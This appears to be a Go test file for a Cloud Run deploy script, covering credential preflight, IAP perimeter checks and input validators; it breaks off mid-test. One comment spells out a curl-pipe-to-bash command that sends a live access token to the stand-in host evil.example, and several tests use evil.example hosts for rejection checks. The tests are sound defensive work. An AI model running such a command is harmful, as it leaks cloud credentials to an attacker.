// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmd

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/GoogleCloudPlatform/scion/pkg/config"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ---------------------------------------------------------------------------
// Helpers: invoke bash functions from deploy.sh in a subprocess
// ---------------------------------------------------------------------------

// deployScriptPath returns the absolute path to scripts/single-node/deploy.sh.
func deployScriptPath(t *testing.T) string {
	t.Helper()
	return filepath.Join(repoRoot(t), "scripts", "single-node", "deploy.sh")
}

// runBashFunc sources deploy.sh and calls the named function with args.
// Returns stdout, stderr, and the exit code.
func runBashFunc(t *testing.T, funcName string, args ...string) (string, string, int) {
	t.Helper()
	scriptPath := deployScriptPath(t)

	// Build a bash command that matches production: di_main runs
	// "set -euo pipefail", so every function it calls inherits those
	// options. Without this, tests are structurally blind to failures
	// caused by set -e killing the script before its own error handling.
	bashCmd := fmt.Sprintf("set -euo pipefail; source %q && %s", scriptPath, funcName)
	for _, a := range args {
		bashCmd += fmt.Sprintf(" %q", a)
	}

	cmd := exec.Command("bash", "-c", bashCmd)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			t.Fatalf("failed to run bash function %s: %v", funcName, err)
		}
	}

	return stdout.String(), stderr.String(), exitCode
}

// ---------------------------------------------------------------------------
// Helpers: invoke bash functions with custom setup (e.g. mock gcloud)
// ---------------------------------------------------------------------------

// runBashFuncWithSetup is like runBashFunc but injects setup commands
// between sourcing deploy.sh and calling the function. This allows
// mocking gcloud or setting environment variables for testing.
func runBashFuncWithSetup(t *testing.T, setup, funcName string, args ...string) (string, string, int) {
	t.Helper()
	scriptPath := deployScriptPath(t)

	bashCmd := fmt.Sprintf("set -euo pipefail; source %q; %s; %s", scriptPath, setup, funcName)
	for _, a := range args {
		bashCmd += fmt.Sprintf(" %q", a)
	}

	cmd := exec.Command("bash", "-c", bashCmd)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			t.Fatalf("failed to run bash function %s: %v", funcName, err)
		}
	}

	return stdout.String(), stderr.String(), exitCode
}

// ---------------------------------------------------------------------------
// Preflight: ADC credential check tests
//
// Two rules hold for every test in this section, and both were learned the
// hard way in review r1:
//
//  1. HERMETIC. Every test points BOTH _DI_TOKENINFO_URL and _DI_API_BASE at a
//     local stub. An earlier version of TestScriptPreflightFailsWithoutADC set
//     neither, so it minted a real 1024-character access token, sent it to the
//     real oauth2.googleapis.com/tokeninfo in a query string, called the real
//     Cloud Run API — and then passed anyway, because the generic remedy string
//     happened to appear in stderr. A unit test must never put a live
//     cloud-platform credential on the network.
//
//  2. THE gcloud STUB ANSWERS ONLY THE ADC FORM, AND RECORDS ITS ARGV. Mocks
//     of the shape `gcloud() { echo "ya29.fake"; }` answer any invocation, so
//     they cannot tell `gcloud auth application-default print-access-token`
//     (correct) from `gcloud auth print-access-token` (the bug being fixed).
//     All four original tests passed against the buggy source. Recording argv
//     and asserting on it is what pins the token source.
// ---------------------------------------------------------------------------

// gcloudArgvLog returns a path in the test's temp dir for the gcloud stub to
// record its argv to, one invocation per line.
func gcloudArgvLog(t *testing.T) string {
	t.Helper()
	return filepath.Join(t.TempDir(), "gcloud-argv.log")
}

// readGcloudArgvLog reads the argv recorded by a gcloud stub. It fails the
// test if the stub was never invoked at all.
func readGcloudArgvLog(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path) //nolint:gosec // path is from t.TempDir()
	require.NoError(t, err, "the gcloud stub recorded nothing — gcloud was never called")
	return string(data)
}

// adcGcloudStub builds a bash gcloud() mock that records every invocation to
// argvLog and answers ONLY `gcloud auth application-default print-access-token`.
// Any other invocation is an error, which is what makes tests using this stub
// fail if deploy.sh reverts to the non-ADC credential store.
func adcGcloudStub(argvLog string) string {
	return fmt.Sprintf(`gcloud() {
  printf '%%s\n' "$*" >> %q
  if [[ "$*" == "auth application-default print-access-token" ]]; then
    printf '%%s\n' "ya29.fake-test-token"
    return 0
  fi
  echo "test stub: unexpected gcloud invocation: gcloud $*" >&2
  return 1
}`, argvLog)
}

// brokenADCGcloudStub is adcGcloudStub with the ADC store unavailable: it
// records argv, then fails whatever it is asked for. It simulates a machine
// where `gcloud auth application-default login` has never been run.
func brokenADCGcloudStub(argvLog string) string {
	return fmt.Sprintf(`gcloud() {
  printf '%%s\n' "$*" >> %q
  if [[ "$*" == "auth application-default print-access-token" ]]; then
    echo "ERROR: Application Default Credentials are not available." >&2
    return 1
  fi
  echo "test stub: unexpected gcloud invocation: gcloud $*" >&2
  return 1
}`, argvLog)
}

// newPreflightStub serves both endpoints the preflight talks to: tokeninfo
// (identified by the access_token query parameter) and the Cloud Run v2
// instances API. The returned counter records how many requests arrived, so a
// test can assert that nothing was sent at all.
func newPreflightStub(t *testing.T, tokeninfoJSON string, apiStatus int, apiBody string) (*httptest.Server, *atomic.Int32) {
	t.Helper()
	var hits atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		if r.URL.Query().Get("access_token") != "" {
			w.WriteHeader(http.StatusOK)
			_, _ = io.WriteString(w, tokeninfoJSON)
			return
		}
		w.WriteHeader(apiStatus)
		_, _ = io.WriteString(w, apiBody)
	})) //nolint:bodyclose // httptest server handler, not a client response
	t.Cleanup(server.Close)
	return server, &hits
}

// preflightSetup composes the bash prelude for a preflight test: the gcloud
// stub, plus both test-only URL seams pointed at the stub server.
func preflightSetup(gcloudStub, serverURL string) string {
	return fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q", gcloudStub, serverURL, serverURL)
}

func TestScriptPreflightFailsWithoutADC(t *testing.T) {
	// The stub server must never be touched: with no token there is nothing
	// to validate, so the preflight has to abort before any request goes out.
	server, hits := newPreflightStub(t, `{}`, http.StatusOK, `{}`)
	argvLog := gcloudArgvLog(t)

	_, stderr, exitCode := runBashFuncWithSetup(t,
		preflightSetup(brokenADCGcloudStub(argvLog), server.URL),
		"di_preflight_rest_credential",
		"user@example.com", "us-east4", "test-project")

	assert.NotEqual(t, 0, exitCode, "must fail when ADC is unavailable")
	assert.Contains(t, stderr, "gcloud auth application-default login",
		"error must name the exact remedy: gcloud auth application-default login")
	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
		"the token must be minted from Application Default Credentials — "+
			"`gcloud auth print-access-token` reads a different credential store "+
			"and returns a token type the Cloud Run v2 API rejects "+
			"(ACCESS_TOKEN_TYPE_UNSUPPORTED)")
	assert.Equal(t, int32(0), hits.Load(),
		"nothing may be sent over the wire when no token could be minted")
}

func TestScriptPreflightAbortsOnNon2xxGet(t *testing.T) {
	// tokeninfo answers; the instances API rejects with 403.
	server, _ := newPreflightStub(t,
		`{"email":"user@example.com","email_verified":"true"}`,
		http.StatusForbidden,
		`{"error":{"code":403,"message":"permission denied"}}`)
	argvLog := gcloudArgvLog(t)

	_, stderr, exitCode := runBashFuncWithSetup(t,
		preflightSetup(adcGcloudStub(argvLog), server.URL),
		"di_preflight_rest_credential",
		"user@example.com", "us-east4", "test-project")

	assert.NotEqual(t, 0, exitCode,
		"must fail when validating GET returns non-2xx — this abort prevents "+
			"step 3a from creating an Instance that step 3b cannot configure")
	assert.Contains(t, stderr, "403",
		"error must include the HTTP status code")
	assert.Contains(t, stderr, "run.instances.list",
		"a 403 means the credential is valid but unauthorized — the message must "+
			"name the missing permission, not just tell the operator to re-login")
	assert.Contains(t, stderr, "gcloud auth application-default login",
		"error must name the remedy")
	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
		"the validated token must come from Application Default Credentials")
}

func TestScriptPreflightWarnsOnIdentityMismatch(t *testing.T) {
	// tokeninfo reports a different email than the active gcloud account.
	server, _ := newPreflightStub(t,
		`{"email":"adc-user@example.com","email_verified":"true"}`,
		http.StatusOK, `{}`)
	argvLog := gcloudArgvLog(t)

	_, stderr, exitCode := runBashFuncWithSetup(t,
		preflightSetup(adcGcloudStub(argvLog), server.URL),
		"di_preflight_rest_credential",
		"gcloud-user@example.com", "us-east4", "test-project")

	assert.Equal(t, 0, exitCode,
		"identity mismatch is a warning, not a failure — a deliberate mismatch "+
			"is legitimate; stderr: %s", stderr)
	assert.Contains(t, stderr, "WARNING",
		"must emit a warning")
	assert.Contains(t, stderr, "gcloud-user@example.com",
		"warning must name the gcloud account")
	assert.Contains(t, stderr, "adc-user@example.com",
		"warning must name the ADC identity")
	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
		"the compared identity must be the ADC identity")
}

// TestScriptPreflightSkipsComparisonWhenTokeninfoOmitsEmail pins the fix for
// the false positive found in review r1. A service-account ADC token scoped to
// cloud-platform gets a tokeninfo response with azp/aud/scope and NO email.
// azp is a numeric client ID, so comparing it against the gcloud account's
// email address can never match — the warning fired on every single
// service-account run (metadata server, GCE, Cloud Shell, CI), which is alarm
// fatigue on the exact signal the warning exists to carry.
func TestScriptPreflightSkipsComparisonWhenTokeninfoOmitsEmail(t *testing.T) {
	// Measured response shape from a real service-account ADC token.
	server, _ := newPreflightStub(t,
		`{"azp":"110532853671892060667","aud":"110532853671892060667",`+
			`"scope":"https://www.googleapis.com/auth/cloud-platform","access_type":"online"}`,
		http.StatusOK, `{}`)
	argvLog := gcloudArgvLog(t)

	stdout, stderr, exitCode := runBashFuncWithSetup(t,
		preflightSetup(adcGcloudStub(argvLog), server.URL),
		"di_preflight_rest_credential",
		"operator@example.com", "us-east4", "test-project")

	assert.Equal(t, 0, exitCode, "must succeed; stderr: %s", stderr)
	assert.NotContains(t, stderr, "WARNING",
		"must NOT warn: a numeric client ID can never equal an email address, so "+
			"comparing them is a guaranteed false positive on every service-account ADC")
	assert.Contains(t, stdout, "110532853671892060667",
		"the client ID is still worth reporting")
	assert.Contains(t, stdout, "skipped",
		"the operator must be told the comparison was skipped, not left to infer "+
			"a mismatch from two values that were never comparable")
}

func TestScriptPreflightSucceedsWithMatchingIdentity(t *testing.T) {
	server, _ := newPreflightStub(t,
		`{"email":"user@example.com","email_verified":"true"}`,
		http.StatusOK, `{}`)
	argvLog := gcloudArgvLog(t)

	stdout, stderr, exitCode := runBashFuncWithSetup(t,
		preflightSetup(adcGcloudStub(argvLog), server.URL),
		"di_preflight_rest_credential",
		"user@example.com", "us-east4", "test-project")

	assert.Equal(t, 0, exitCode, "must succeed when all checks pass; stderr: %s", stderr)
	assert.NotContains(t, stderr, "WARNING",
		"must NOT warn when identities match")
	assert.Contains(t, stdout, "ADC credential validated successfully",
		"must confirm successful validation")
	assert.Contains(t, stdout, server.URL,
		"the tokeninfo URL must be echoed: the token travels to it in a query "+
			"string, so a redirected endpoint must not be invisible in the output")
	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
		"the token must be minted from Application Default Credentials")
}

// TestScriptPreflightRejectsNonGoogleTokeninfoHost pins the narrowing of the
// _DI_TOKENINFO_URL seam. The token reaches tokeninfo as a URL query
// parameter, where the receiving host logs it, and the script is documented as
// curl-able — so `_DI_TOKENINFO_URL=https://evil.example bash <(curl ...)` is a
// plausible copy-paste accident that exfiltrates a live cloud-platform
// credential. The override is restricted to Google's hosts or loopback.
func TestScriptPreflightRejectsNonGoogleTokeninfoHost(t *testing.T) {
	argvLog := gcloudArgvLog(t)
	setup := fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q",
		adcGcloudStub(argvLog),
		"http://127.0.0.1:1", // never reached
		"https://evil.example/tokeninfo")

	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
		"di_preflight_rest_credential",
		"user@example.com", "us-east4", "test-project")

	assert.NotEqual(t, 0, exitCode,
		"must refuse to send an access token to a host outside googleapis.com")
	assert.Contains(t, stderr, "evil.example",
		"the rejection must name the offending host")
	assert.NoFileExists(t, argvLog,
		"the check must run BEFORE the token is minted — no token should exist "+
			"to leak in the first place")
}

// ---------------------------------------------------------------------------
// Gate 2: Perimeter assertion tests (5 mandatory)
// ---------------------------------------------------------------------------

func TestScriptAssertPerimeter_IAPEnforcing(t *testing.T) {
	// Simulate IAP: 302 to accounts.google.com with IAP header
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Location", "https://accounts.google.com/signin?...")
		w.Header().Set("X-Goog-Iap-Generated-Response", "true")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	_, stderr, exitCode := runBashFunc(t, "di_assert_perimeter", server.URL)
	assert.Equal(t, 0, exitCode, "should succeed when IAP is enforcing; stderr: %s", stderr)
}

func TestScriptAssertPerimeter_AppAnswers(t *testing.T) {
	// Simulate no IAP: app answers directly with 200
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("Hello world"))
	}))
	defer server.Close()

	_, stderr, exitCode := runBashFunc(t, "di_assert_perimeter", server.URL)
	assert.NotEqual(t, 0, exitCode, "must FAIL when app answers directly")
	assert.Contains(t, stderr, "UNPROTECTED",
		"error message must clearly indicate the instance is unprotected")
}

func TestScriptAssertPerimeter_WrongRedirect(t *testing.T) {
	// 302 but not to accounts.google.com
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Location", "https://evil.example.com/phish")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	_, stderr, exitCode := runBashFunc(t, "di_assert_perimeter", server.URL)
	assert.NotEqual(t, 0, exitCode, "must fail when redirect is not to accounts.google.com")
	assert.Contains(t, stderr, "not to accounts.google.com")
}

func TestScriptAssertPerimeter_MissingIAPHeader(t *testing.T) {
	// 302 to accounts.google.com but missing the IAP header — still passes
	// because the redirect alone proves IAP is enforcing; the header is
	// a bonus check.
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Location", "https://accounts.google.com/signin?...")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	_, stderr, exitCode := runBashFunc(t, "di_assert_perimeter", server.URL)
	assert.Equal(t, 0, exitCode, "should pass even without IAP header if redirect is correct; stderr: %s", stderr)
}

func TestScriptAssertPerimeter_302NoLocationHeader(t *testing.T) {
	// 302 with NO Location header at all. Under set -euo pipefail, grep
	// for the header exits 1 and pipefail would kill the script before
	// it reaches its own SECURITY FAILURE message. The "|| location=''"
	// fix at :274 prevents this: the downstream check fires and fails
	// closed with a diagnostic.
	//
	// This test MUST assert the message, not just the exit code — both
	// the broken and fixed code exit 1, so an exit-code-only test would
	// pass on broken code.
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// 302 but deliberately no Location header
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	_, stderr, exitCode := runBashFunc(t, "di_assert_perimeter", server.URL)
	assert.Equal(t, 1, exitCode, "must fail when 302 has no Location header")
	assert.Contains(t, stderr, "SECURITY FAILURE",
		"must print SECURITY FAILURE, not die silently from set -e")
	assert.Contains(t, stderr, "not to accounts.google.com",
		"must identify the problem as a wrong/missing redirect target")
}

func TestScriptAssertPerimeter_CloudRunErrorPage(t *testing.T) {
	// When the Instance is dead (wrong port, crash loop, missing binary),
	// Cloud Run returns its own error page (502 or 503) instead of the
	// IAP 302. The error message must mention Instance health so the
	// operator knows the problem is the container, not IAP.
	for _, code := range []int{http.StatusBadGateway, http.StatusServiceUnavailable} {
		t.Run(fmt.Sprintf("status_%d", code), func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(code)
				_, _ = w.Write([]byte("Cloud Run error page"))
			}))
			defer server.Close()

			_, stderr, exitCode := runBashFunc(t, "di_assert_perimeter", server.URL)
			assert.NotEqual(t, 0, exitCode, "must fail when Cloud Run returns %d", code)
			assert.Contains(t, stderr, "not be serving",
				"error message must mention the instance may not be serving")
			assert.Contains(t, stderr, "CMD",
				"error message must suggest checking the Dockerfile CMD")
		})
	}
}

// ---------------------------------------------------------------------------
// IAM member prefix tests
// ---------------------------------------------------------------------------

func TestScriptIAMMemberPrefix_UserEmail(t *testing.T) {
	stdout, _, exitCode := runBashFunc(t, "di_iam_member_prefix", "admin@example.com")
	assert.Equal(t, 0, exitCode)
	assert.Equal(t, "user:", strings.TrimSpace(stdout),
		"normal email must produce user: prefix")
}

func TestScriptIAMMemberPrefix_ServiceAccount(t *testing.T) {
	stdout, _, exitCode := runBashFunc(t, "di_iam_member_prefix", "deploy@my-project.iam.gserviceaccount.com")
	assert.Equal(t, 0, exitCode)
	assert.Equal(t, "serviceAccount:", strings.TrimSpace(stdout),
		"service account email must produce serviceAccount: prefix")
}

// ---------------------------------------------------------------------------
// Validate project number tests
// ---------------------------------------------------------------------------

func TestScriptValidateProjectNumber_Clean(t *testing.T) {
	for _, num := range []string{"123456789", "0", "721899303052"} {
		t.Run(num, func(t *testing.T) {
			_, _, exitCode := runBashFunc(t, "di_validate_project_number", num)
			assert.Equal(t, 0, exitCode,
				"valid project number %q must be accepted", num)
		})
	}
}

func TestScriptValidateProjectNumber_Contaminated(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{
			name:  "impersonation warning prefix",
			input: "WARNING: This command is using service account impersonation. All API calls will be executed as [sa@proj.iam.gserviceaccount.com].\n721899303052",
		},
		{
			name:  "warning inline",
			input: "WARNING: 721899303052",
		},
		{
			name:  "letters mixed in",
			input: "72abc1899",
		},
		{
			name:  "whitespace",
			input: " 721899303052 ",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, exitCode := runBashFunc(t, "di_validate_project_number", tt.input)
			assert.NotEqual(t, 0, exitCode,
				"contaminated project number %q must be rejected", tt.input)
		})
	}
}

// TestScriptValidateProjectNumber_Empty is separated because the Go test
// used an empty string which bash handles differently (empty arg vs no arg).
func TestScriptValidateProjectNumber_Empty(t *testing.T) {
	_, _, exitCode := runBashFunc(t, "di_validate_project_number", "")
	assert.NotEqual(t, 0, exitCode,
		"empty project number must be rejected")
}

// ---------------------------------------------------------------------------
// Validate instance URL tests
// ---------------------------------------------------------------------------

func TestScriptValidateInstanceURL_Valid(t *testing.T) {
	_, _, exitCode := runBashFunc(t, "di_validate_instance_url", "https://my-instance-123456789.us-east4.run.app")
	assert.Equal(t, 0, exitCode)
}

func TestScriptValidateInstanceURL_Contaminated(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{
			name:  "warning in host",
			input: "https://ssh-probe-WARNING: This command is using service account imperson....run.app",
		},
		{
			name:  "not https",
			input: "http://my-instance-123.us-east4.run.app",
		},
		{
			name:  "wrong domain",
			input: "https://my-instance-123.us-east4.example.com",
		},
		{
			name:  "empty string",
			input: "",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, exitCode := runBashFunc(t, "di_validate_instance_url", tt.input)
			assert.NotEqual(t, 0, exitCode,
				"invalid instance URL %q must be rejected", tt.input)
		})
	}
}

// ---------------------------------------------------------------------------
// Registry derivation tests
// ---------------------------------------------------------------------------

func TestScriptDeriveRegistry_Valid(t *testing.T) {
	tests := []struct {
		name  string
		image string
		want  string
	}{
		{
			name:  "ghcr with tag",
			image: "ghcr.io/ptone/scion-omni:latest",
			want:  "ghcr.io/ptone",
		},
		{
			name:  "ghcr with version tag",
			image: "ghcr.io/ptone/scion-omni:v1.2.3",
			want:  "ghcr.io/ptone",
		},
		{
			name:  "ghcr with digest",
			image: "ghcr.io/ptone/scion-omni@sha256:abcdef1234567890",
			want:  "ghcr.io/ptone",
		},
		{
			name:  "ghcr no tag",
			image: "ghcr.io/ptone/scion-omni",
			want:  "ghcr.io/ptone",
		},
		{
			name:  "gcr with nested path",
			image: "us-docker.pkg.dev/my-project/my-repo/scion-omni:latest",
			want:  "us-docker.pkg.dev/my-project/my-repo",
		},
		{
			name:  "localhost with port",
			image: "localhost:5000/myimage:latest",
			want:  "localhost:5000",
		},
		{
			name:  "tag with digest combined",
			image: "ghcr.io/ptone/scion-omni:v1@sha256:abcdef",
			want:  "ghcr.io/ptone",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			stdout, stderr, exitCode := runBashFunc(t, "di_derive_registry", tt.image)
			require.Equal(t, 0, exitCode, "di_derive_registry(%q) failed: %s", tt.image, stderr)
			assert.Equal(t, tt.want, strings.TrimSpace(stdout))
		})
	}
}

func TestScriptDeriveRegistry_Invalid(t *testing.T) {
	tests := []struct {
		name  string
		image string
	}{
		{
			name:  "bare image with tag",
			image: "nginx:latest",
		},
		{
			name:  "bare image no tag",
			image: "nginx",
		},
		{
			name:  "docker library path",
			image: "library/nginx:latest",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, exitCode := runBashFunc(t, "di_derive_registry", tt.image)
			assert.NotEqual(t, 0, exitCode,
				"should reject image %q with no derivable registry", tt.image)
		})
	}
}

// ---------------------------------------------------------------------------
// Admin email comma rejection tests
// ---------------------------------------------------------------------------

func TestScriptRejectsCommaInAdminEmail(t *testing.T) {
	tests := []struct {
		name      string
		email     string
		wantError bool
	}{
		{
			name:      "valid single email",
			email:     "admin@example.com",
			wantError: false,
		},
		{
			name:      "comma-separated emails rejected",
			email:     "alice@example.com,bob@example.com",
			wantError: true,
		},
		{
			name:      "trailing comma rejected",
			email:     "admin@example.com,",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, exitCode := runBashFunc(t, "di_validate_admin_email", tt.email)
			if tt.wantError {
				assert.NotEqual(t, 0, exitCode,
					"comma guard must reject %q", tt.email)
			} else {
				assert.Equal(t, 0, exitCode,
					"comma guard must accept %q", tt.email)
			}
		})
	}
}

func TestScriptCommaInEmailBreaksGcloud(t *testing.T) {
	// Demonstrate WHY the comma guard exists: gcloud --set-env-vars uses
	// commas as the delimiter between key=value pairs.
	envVarStr := fmt.Sprintf(
		"SCION_SERVER_AUTH_MODE=proxy,SCION_SERVER_HUB_ADMINEMAILS=%s",
		"alice@example.com,bob@example.com")

	parts := strings.Split(envVarStr, ",")
	assert.Equal(t, 3, len(parts),
		"comma in email value causes gcloud to see 3 env vars instead of 2")
	assert.Equal(t, "bob@example.com", parts[2],
		"the second email becomes a broken env var fragment")
}

// ---------------------------------------------------------------------------
// IAP enable PATCH body and URL tests (via stub server)
// ---------------------------------------------------------------------------

func TestScriptEnableIAPPatchBody(t *testing.T) {
	// Verify the PATCH body by inspecting what di_iap_patch_body returns.
	stdout, _, exitCode := runBashFunc(t, "di_iap_patch_body")
	require.Equal(t, 0, exitCode)

	body := strings.TrimSpace(stdout)
	assert.Contains(t, body, `"iapEnabled":true`,
		"PATCH body must contain iapEnabled:true")
	assert.Contains(t, body, `"invokerIamDisabled":true`,
		"PATCH body must contain invokerIamDisabled:true")

	// Count the number of keys — should be exactly 2
	// Simple check: count occurrences of ":"
	assert.Equal(t, 2, strings.Count(body, ":"),
		"PATCH body must contain exactly 2 fields (iapEnabled and invokerIamDisabled)")
}

func TestScriptEnableIAPUpdateMask(t *testing.T) {
	// Verify the PATCH URL contains the correct updateMask.
	stdout, _, exitCode := runBashFunc(t, "di_build_iap_patch_url", "us-east4", "my-project", "my-instance")
	require.Equal(t, 0, exitCode)

	url := strings.TrimSpace(stdout)
	assert.Contains(t, url, "updateMask=",
		"PATCH URL must include updateMask")
	assert.Contains(t, url, "iapEnabled",
		"updateMask must include iapEnabled")
	assert.Contains(t, url, "invokerIamDisabled",
		"updateMask must include invokerIamDisabled")
}

// ---------------------------------------------------------------------------
// Env var round-trip tests — read deploy.sh, extract env vars, validate
// through config.LoadGlobalConfig
// ---------------------------------------------------------------------------

// extractEnvVarsFromDeployScript reads deploy.sh and extracts the env var
// names from the --set-env-vars line. Returns a map of env var name → value
// template (with ${...} placeholders replaced by sample values).
func extractEnvVarsFromDeployScript(t *testing.T) map[string]string {
	t.Helper()
	script := readDeployScript(t)

	// Find the --set-env-vars line. It's a comma-delimited list of KEY=VALUE
	// pairs. The format in the script is:
	//   --set-env-vars "KEY1=val1,KEY2=val2,..."
	re := regexp.MustCompile(`--set-env-vars\s+"([^"]+)"`)
	match := re.FindStringSubmatch(script)
	require.NotNil(t, match, "could not find --set-env-vars in deploy.sh")

	envStr := match[1]
	// Split on commas, but respect ${...} which may contain commas (they don't
	// in this case, but be safe).
	pairs := strings.Split(envStr, ",")

	result := make(map[string]string)
	for _, pair := range pairs {
		eqIdx := strings.Index(pair, "=")
		require.Greater(t, eqIdx, 0, "malformed env var pair: %q", pair)
		key := pair[:eqIdx]
		val := pair[eqIdx+1:]
		result[key] = val
	}
	return result
}

// TestScriptDeployEnvVarsRoundTrip proves that the env vars deploy.sh sets
// load correctly through the config system into the structs the hub reads.
// The critical concern is that Auth.Proxy (*ProxyAuthConfig) and Proxy.IAP
// (*IAPAuthConfig) are pointer fields — if koanf/mapstructure doesn't
// allocate them, the audience is empty and the hub fails at startup.
func TestScriptDeployEnvVarsRoundTrip(t *testing.T) {
	envVars := extractEnvVarsFromDeployScript(t)

	// Verify the expected env var names are present in the script.
	require.Contains(t, envVars, "SCION_SERVER_MODE",
		"deploy.sh must set SCION_SERVER_MODE")
	require.Contains(t, envVars, "SCION_SERVER_AUTH_MODE",
		"deploy.sh must set SCION_SERVER_AUTH_MODE")
	require.Contains(t, envVars, "SCION_SERVER_AUTH_PROXY_PROVIDER",
		"deploy.sh must set SCION_SERVER_AUTH_PROXY_PROVIDER")
	require.Contains(t, envVars, "SCION_SERVER_AUTH_PROXY_IAP_AUDIENCE",
		"deploy.sh must set SCION_SERVER_AUTH_PROXY_IAP_AUDIENCE")
	require.Contains(t, envVars, "SCION_SERVER_HUB_ADMINEMAILS",
		"deploy.sh must set SCION_SERVER_HUB_ADMINEMAILS")
	require.Contains(t, envVars, "SCION_IMAGE_REGISTRY",
		"deploy.sh must set SCION_IMAGE_REGISTRY")

	// Use a clean HOME so no existing settings.yaml / server.yaml interfere.
	tmpDir := t.TempDir()
	t.Setenv("HOME", tmpDir)
	scionDir := filepath.Join(tmpDir, ".scion")
	require.NoError(t, os.MkdirAll(scionDir, 0755))

	// Set env vars with sample values matching what the script would produce.
	t.Setenv("SCION_SERVER_MODE", "hosted")
	t.Setenv("SCION_SERVER_AUTH_MODE", "proxy")
	t.Setenv("SCION_SERVER_AUTH_PROXY_PROVIDER", "iap")
	t.Setenv("SCION_SERVER_AUTH_PROXY_IAP_AUDIENCE",
		"/projects/123456789/locations/us-east4/services/test-instance")
	t.Setenv("SCION_SERVER_HUB_ADMINEMAILS", "admin@example.com")

	gc, err := config.LoadGlobalConfig("")
	require.NoError(t, err, "LoadGlobalConfig must succeed with deploy env vars")

	assert.Equal(t, "hosted", gc.Mode,
		"Mode must be 'hosted' — without this the server runs in workstation "+
			"mode, auto-enables dev auth, and crashes on a non-loopback host")
	assert.Equal(t, "proxy", gc.Auth.Mode,
		"Auth.Mode must be 'proxy'")
	require.NotNil(t, gc.Auth.Proxy,
		"Auth.Proxy pointer must be allocated by config loading")
	assert.Equal(t, "iap", gc.Auth.Proxy.Provider,
		"Auth.Proxy.Provider must be 'iap'")
	require.NotNil(t, gc.Auth.Proxy.IAP,
		"Auth.Proxy.IAP pointer must be allocated by config loading")
	assert.Equal(t,
		"/projects/123456789/locations/us-east4/services/test-instance",
		gc.Auth.Proxy.IAP.Audience,
		"Auth.Proxy.IAP.Audience must match the IAP audience path")

	// Admin email reaches cfg.Hub.AdminEmails
	assert.Contains(t, gc.Hub.AdminEmails, "admin@example.com",
		"SCION_SERVER_HUB_ADMINEMAILS must populate cfg.Hub.AdminEmails — "+
			"this is the field parseAdminEmails reads to set the admin role")
}

// TestScriptDeployHostedModeEnvRequired is a pinning test.
// When SCION_SERVER_MODE is absent, the server defaults to workstation mode.
// Workstation mode calls applyWorkstationDefaults which sets enableDevAuth=true.
// On Cloud Run the host is 0.0.0.0, so the non-loopback dev-auth guard fires
// and the server exits immediately. SCION_SERVER_MODE=hosted is the fix.
func TestScriptDeployHostedModeEnvRequired(t *testing.T) {
	envVars := extractEnvVarsFromDeployScript(t)
	require.Contains(t, envVars, "SCION_SERVER_MODE",
		"deploy.sh must set SCION_SERVER_MODE")
	require.Equal(t, "hosted", envVars["SCION_SERVER_MODE"],
		"deploy.sh must set SCION_SERVER_MODE=hosted")

	tmpDir := t.TempDir()
	t.Setenv("HOME", tmpDir)
	require.NoError(t, os.MkdirAll(filepath.Join(tmpDir, ".scion"), 0755))

	t.Setenv("SCION_SERVER_MODE", "hosted")

	gc, err := config.LoadGlobalConfig("")
	require.NoError(t, err)

	assert.Equal(t, "hosted", gc.Mode,
		"SCION_SERVER_MODE=hosted must map to cfg.Mode='hosted' — "+
			"without this, workstation defaults enable dev auth and crash the server")
